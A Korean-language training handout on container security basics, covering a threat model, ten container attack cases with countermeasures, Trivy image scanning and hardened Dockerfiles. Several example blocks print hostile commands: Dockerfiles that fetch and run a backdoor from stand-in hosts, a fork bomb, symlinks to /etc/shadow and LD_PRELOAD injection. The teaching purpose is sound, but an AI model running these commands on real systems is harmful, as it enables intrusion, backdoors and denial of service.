# Week 2 Day 3 Session 1: 컨테이너 보안 기초

<div align="center">

**🔒 컨테이너 보안** • **🛡️ 위협 모델** • **🔍 취약점 스캔**

*실무에서 필수인 컨테이너 보안 위협 이해와 대응 방안*

</div>

---

## 🕘 세션 정보
**시간**: 09:00-09:50 (50분)
**목표**: 컨테이너 환경의 보안 위협과 대응 방안 완전 이해
**방식**: 이론 학습 + 페어 토론 + 실습 준비

## 🎯 세션 목표
### 📚 학습 목표
- **이해 목표**: 컨테이너 환경의 보안 위협과 대응 방안 완전 이해
- **적용 목표**: 실무에서 사용할 수 있는 보안 도구와 기법 습득
- **협업 목표**: 팀원들과 보안 정책 수립 및 적용 전략 토론

### 🤔 왜 필요한가? (5분)

**현실 문제 상황**:
- 💼 **보안 사고**: 컨테이너 취약점으로 인한 실제 보안 사고 급증
- 🏠 **일상 비유**: 집의 문은 잠갔지만 창문을 열어둔 것과 같은 위험
- 📊 **시장 동향**: DevSecOps로의 패러다임 전환, 보안의 Shift-Left

**학습 전후 비교**:
```mermaid
graph LR
    A[학습 전<br/>보안 무관심] --> B[학습 후<br/>보안 전문가]
    
    style A fill:#ffebee
    style B fill:#e8f5e8
```

## 📖 핵심 개념 (35분)

### 🔍 개념 1: 컨테이너 보안 위협 모델 (12분)
> **정의**: 컨테이너 환경에서 발생할 수 있는 다양한 보안 위협과 공격 벡터

**컨테이너 보안 계층**:
```mermaid
graph TB
    subgraph "컨테이너 보안 계층"
        A[애플리케이션 보안<br/>Application Security] --> B[컨테이너 런타임 보안<br/>Runtime Security]
        B --> C[이미지 보안<br/>Image Security]
        C --> D[호스트 보안<br/>Host Security]
        D --> E[네트워크 보안<br/>Network Security]
    end
    
    subgraph "주요 위협"
        F[취약한 이미지<br/>Vulnerable Images] --> A
        G[권한 상승<br/>Privilege Escalation] --> B
        H[컨테이너 탈출<br/>Container Escape] --> C
        I[호스트 침해<br/>Host Compromise] --> D
        J[네트워크 공격<br/>Network Attacks] --> E
    end
    
    style A fill:#ffebee
    style B fill:#ffebee
    style C fill:#ffebee
    style D fill:#ffebee
    style E fill:#ffebee
    style F fill:#f44336
    style G fill:#f44336
    style H fill:#f44336
    style I fill:#f44336
    style J fill:#f44336
```

**주요 보안 위협**:
- **취약한 베이스 이미지**: 알려진 CVE가 포함된 이미지 사용
- **과도한 권한**: root 권한으로 실행되는 컨테이너
- **시크릿 노출**: 하드코딩된 패스워드나 API 키
- **네트워크 노출**: 불필요한 포트 개방
- **리소스 남용**: 무제한 리소스 사용으로 인한 DoS

### 🚨 실제 컨테이너 공격 사례 5가지 (추가 학습)

#### 1. **Container Escape (컨테이너 탈출)**
> **공격 방법**: 컨테이너 내부에서 호스트 시스템으로 탈출하여 전체 시스템 제어

```bash
# 위험한 예시 - 절대 실제 환경에서 사용 금지
# --privileged 옵션으로 실행된 컨테이너에서 호스트 접근
docker run --privileged -it ubuntu:latest /bin/bash
# 컨테이너 내부에서 호스트 파일시스템 마운트
mount /dev/sda1 /mnt
chroot /mnt
```

**대응 방안**:
- `--privileged` 옵션 사용 금지
- 필요한 경우에만 특정 capability 부여
- AppArmor/SELinux 보안 프로파일 적용

#### 2. **Dirty COW (CVE-2016-5195) 활용**
> **공격 방법**: 리눅스 커널 취약점을 이용한 권한 상승 공격

```bash
# 취약점 확인 (교육 목적)
cat /proc/version  # 커널 버전 확인
# 2.6.22 < kernel < 4.8.3 버전에서 취약

# 공격 시나리오
# 1. 읽기 전용 파일을 쓰기 가능하게 변경
# 2. /etc/passwd 파일 수정으로 root 권한 획득
```

**대응 방안**:
- 호스트 커널 정기 업데이트
- 컨테이너 런타임 보안 업데이트
- 읽기 전용 파일시스템 사용

#### 3. **Docker Socket 노출 공격**
> **공격 방법**: Docker 소켓을 컨테이너에 마운트하여 호스트 제어

```bash
# 위험한 설정 예시 - 절대 사용 금지
docker run -v /var/run/docker.sock:/var/run/docker.sock \
           -it docker:latest /bin/sh

# 컨테이너 내부에서 호스트의 다른 컨테이너 제어 가능
docker ps  # 호스트의 모든 컨테이너 조회
docker exec -it target_container /bin/bash  # 다른 컨테이너 접근
```

**대응 방안**:
- Docker 소켓 마운트 절대 금지
- 필요시 Docker-in-Docker 대신 Kaniko, Buildah 사용
- 최소 권한 원칙 적용

#### 4. **Malicious Image Supply Chain Attack**
> **공격 방법**: 악성 코드가 포함된 이미지를 공식 이미지로 위장하여 배포

```bash
# 공격 시나리오
# 1. 인기 있는 이미지와 유사한 이름으로 악성 이미지 업로드
# 예: nginx -> ngnix, ubuntu -> ubunto

# 2. 이미지 내부에 백도어나 크립토마이너 삽입
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
# 악성 스크립트 다운로드 및 실행
RUN curl -s http://malicious-site.com/backdoor.sh | bash
```

**대응 방안**:
- 공식 이미지만 사용 (Docker Official Images)
- 이미지 서명 검증 (Docker Content Trust)
- 프라이빗 레지스트리 사용
- 이미지 스캔 도구로 사전 검증

#### 5. **Resource Exhaustion (Fork Bomb)**
> **공격 방법**: 컨테이너 내에서 무한 프로세스 생성으로 호스트 리소스 고갈

```bash
# Fork Bomb 예시 - 절대 실제 환경에서 실행 금지
# Bash Fork Bomb
:(){ :|:& };:

# Python Fork Bomb
import os
while True:
    os.fork()

# 결과: 시스템 리소스 고갈로 호스트 다운
```

**대응 방안**:
```bash
# 리소스 제한 설정
docker run --memory=512m \
           --cpus=1.0 \
           --pids-limit=100 \
           --ulimit nproc=1024:2048 \
           ubuntu:latest
```

#### 6. **Symlink Attack (심볼릭 링크 공격)**
> **공격 방법**: 심볼릭 링크를 이용하여 호스트 파일시스템의 민감한 파일에 접근

```bash
# 공격 시나리오
# 1. 컨테이너 내부에서 호스트 파일을 가리키는 심볼릭 링크 생성
ln -s /etc/passwd /app/config.txt
ln -s /etc/shadow /app/secrets.txt

# 2. 애플리케이션이 이 파일들을 읽으면서 호스트 정보 노출
cat /app/config.txt  # 실제로는 /etc/passwd 내용
```

**대응 방안**:
- 읽기 전용 파일시스템 사용
- 심볼릭 링크 생성 금지 정책
- 파일 접근 권한 엄격히 제한

#### 7. **Environment Variable Injection**
> **공격 방법**: 환경 변수를 통한 악성 코드 주입 및 설정 변조

```bash
# 위험한 환경 변수 설정 예시
docker run -e "PATH=/malicious/path:$PATH" \
           -e "LD_PRELOAD=/malicious/lib.so" \
           -e "DATABASE_URL=postgresql://attacker:pass@evil.com/db" \
           vulnerable-app:latest

# 애플리케이션 실행 시 악성 라이브러리 로드 또는 잘못된 DB 연결
```

**대응 방안**:
- 환경 변수 화이트리스트 방식 사용
- 민감한 정보는 Secret 관리 도구 사용
- 환경 변수 검증 로직 구현

#### 8. **Shared Namespace Attack**
> **공격 방법**: 네임스페이스 공유를 통한 다른 컨테이너나 호스트 정보 접근

```bash
# 위험한 네임스페이스 공유 예시
# PID 네임스페이스 공유로 호스트 프로세스 조회
docker run --pid=host -it ubuntu:latest ps aux

# 네트워크 네임스페이스 공유로 호스트 네트워크 접근
docker run --net=host -it ubuntu:latest netstat -tulpn

# IPC 네임스페이스 공유로 다른 프로세스와 통신
docker run --ipc=host -it ubuntu:latest ipcs
```

**대응 방안**:
- 기본 네임스페이스 격리 유지
- 필요한 경우에만 제한적 네임스페이스 공유
- 네임스페이스 공유 시 추가 보안 조치

#### 9. **Image Layer Poisoning**
> **공격 방법**: 이미지 레이어에 악성 코드를 숨겨서 탐지를 회피

```dockerfile
# 공격 시나리오 - 중간 레이어에 악성 코드 삽입
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
# 악성 파일 다운로드 (숨겨진 레이어)
RUN curl -s http://malicious.com/backdoor -o /tmp/.hidden
RUN chmod +x /tmp/.hidden
# 정상적인 애플리케이션 설치로 위장
RUN apt-get install -y nginx
# 시작 스크립트에서 백도어 실행
RUN echo '/tmp/.hidden &' >> /etc/rc.local
```

**대응 방안**:
- 멀티 스테이지 빌드로 최종 이미지 최소화
- 이미지 레이어별 스캔
- 베이스 이미지 신뢰성 검증

#### 10. **Container Breakout via Kernel Exploits**
> **공격 방법**: 커널 취약점을 이용한 컨테이너 탈출 및 호스트 권한 획득

```bash
# 커널 취약점 예시 (CVE-2022-0847 - Dirty Pipe)
# 파이프를 통한 읽기 전용 파일 수정 취약점

# 1. 취약점 확인
uname -r  # 커널 버전 확인
# 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102에서 취약

# 2. 공격 시나리오
# - 읽기 전용 파일 수정
# - /etc/passwd 변조로 root 권한 획득
# - 컨테이너에서 호스트로 탈출
```

**대응 방안**:
- 커널 정기 업데이트
- 컨테이너 런타임 보안 패치
- gVisor, Kata Containers 등 추가 격리 기술 사용
- 런타임 보안 모니터링 (Falco 등)

**종합 보안 체크리스트**:
```mermaid
graph TB
    A[컨테이너 보안 체크] --> B{권한 검사}
    B -->|Pass| C{이미지 검증}
    B -->|Fail| X[배포 중단]
    C -->|Pass| D{리소스 제한}
    C -->|Fail| X
    D -->|Pass| E{네트워크 정책}
    D -->|Fail| X
    E -->|Pass| F[배포 승인]
    E -->|Fail| X
    
    style A fill:#e3f2fd
    style B fill:#fff3e0
    style C fill:#fff3e0
    style D fill:#fff3e0
    style E fill:#fff3e0
    style F fill:#4caf50
    style X fill:#f44336
```

### 🔍 개념 2: 이미지 보안 스캔 (12분)
> **정의**: 컨테이너 이미지의 취약점을 자동으로 검사하고 보고하는 프로세스

**보안 스캔 워크플로우**:
```mermaid
graph LR
    A[이미지 빌드] --> B[취약점 스캔<br/>Vulnerability Scan]
    B --> C{보안 정책<br/>통과?}
    C -->|Yes| D[레지스트리 푸시]
    C -->|No| E[빌드 실패<br/>수정 필요]
    E --> A
    D --> F[배포 승인]
    
    style A fill:#e3f2fd
    style B fill:#fff3e0
    style C fill:#ffeb3b
    style D fill:#4caf50
    style E fill:#f44336
    style F fill:#2196f3
```

**주요 스캔 도구**:
- **Trivy**: 오픈소스 취약점 스캐너
- **Clair**: CoreOS의 정적 분석 도구
- **Snyk**: 상용 보안 플랫폼
- **Anchore**: 엔터프라이즈 이미지 스캔

**스캔 실습 예시**:
```bash
# Trivy로 이미지 스캔
trivy image nginx:latest

# 심각도별 필터링
trivy image --severity HIGH,CRITICAL nginx:latest

# JSON 형태로 결과 출력
trivy image --format json nginx:latest > scan-result.json
```

### 🔍 개념 3: 런타임 보안 강화 (11분)
> **정의**: 컨테이너 실행 시점에서 적용하는 보안 조치와 모니터링

**런타임 보안 기법**:
```mermaid
graph TB
    subgraph "런타임 보안 조치"
        A[비root 사용자<br/>Non-root User] --> D[보안 강화]
        B[읽기 전용 파일시스템<br/>Read-only Filesystem] --> D
        C[리소스 제한<br/>Resource Limits] --> D
    end
    
    subgraph "보안 모니터링"
        E[파일 시스템 감시<br/>File System Monitoring] --> F[실시간 탐지]
        G[네트워크 트래픽 분석<br/>Network Analysis] --> F
        H[프로세스 모니터링<br/>Process Monitoring] --> F
    end
    
    D --> F
    
    style A fill:#e8f5e8
    style B fill:#e8f5e8
    style C fill:#e8f5e8
    style D fill:#4caf50
    style E fill:#fff3e0
    style G fill:#fff3e0
    style H fill:#fff3e0
    style F fill:#2196f3
```

**보안 강화 Dockerfile 예시**:
```dockerfile
FROM node:18-alpine

# 보안 강화: 비root 사용자 생성
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nextjs -u 1001

# 애플리케이션 파일 복사
COPY --chown=nextjs:nodejs . .

# 비root 사용자로 전환
USER nextjs

# 읽기 전용 파일시스템 (docker run 시 --read-only 옵션)
# 리소스 제한 (docker run 시 --memory, --cpus 옵션)

EXPOSE 3000
CMD ["node", "server.js"]
```

## 💭 함께 생각해보기 (10분)

**🤝 페어 토론** (5분):
**토론 주제**:
1. **보안 vs 편의성**: "보안을 강화하면서도 개발 편의성을 유지하는 방법은?"
2. **보안 정책**: "우리 조직에 맞는 컨테이너 보안 정책은 어떻게 수립해야 할까요?"
3. **자동화**: "보안 검사를 CI/CD 파이프라인에 어떻게 통합할까요?"

**페어 활동 가이드**:
- 👥 **자유 페어링**: 관심사나 이해도가 비슷한 사람끼리
- 🔄 **역할 교대**: 5분씩 설명자/질문자 역할 바꾸기
- 📝 **핵심 정리**: 대화 내용 중 중요한 점 메모하기

**🎯 전체 공유** (5분):
- **인사이트 공유**: 페어 토론에서 나온 좋은 아이디어
- **질문 수집**: 아직 이해가 어려운 부분
- **다음 연결**: 다음 세션과의 연결고리 확인

**💡 이해도 체크 질문**:
- ✅ "컨테이너 보안 위협의 주요 계층을 설명할 수 있나요?"
- ✅ "이미지 스캔이 왜 중요한지 이해했나요?"
- ✅ "런타임 보안 강화 방법을 실무에 적용할 수 있나요?"

## 🔑 핵심 키워드

### 🔤 기본 용어
- **CVE (Common Vulnerabilities and Exposures)**: 공통 취약점 및 노출 데이터베이스
- **SAST (Static Application Security Testing)**: 정적 애플리케이션 보안 테스트
- **DAST (Dynamic Application Security Testing)**: 동적 애플리케이션 보안 테스트

### 🔤 기술 용어
- **Container Escape**: 컨테이너에서 호스트로 탈출하는 공격
- **Privilege Escalation**: 권한 상승 공격
- **Supply Chain Attack**: 공급망 공격

### 🔤 도구 및 플랫폼
- **Trivy**: 오픈소스 취약점 스캐너
- **Falco**: 런타임 보안 모니터링 도구
- **OPA (Open Policy Agent)**: 정책 엔진

## 📝 세션 마무리
### ✅ 오늘 세션 성과
- 컨테이너 보안 위협 모델 완전 이해
- 이미지 보안 스캔의 중요성과 실습 방법 습득
- 런타임 보안 강화 기법 학습

### 🎯 다음 세션 준비
- **Session 2**: 이미지 최적화 & 성능 튜닝
- **연결고리**: 보안 강화된 이미지를 성능 최적화하는 방법
- **실습 준비**: 보안 스캔 도구 설치 및 환경 준비

---

<div align="center">

**🔒 보안 위협 이해** • **🛡️ 스캔 도구 활용** • **🔍 런타임 보안**

*컨테이너 보안의 기초를 완전히 마스터했습니다*

</div>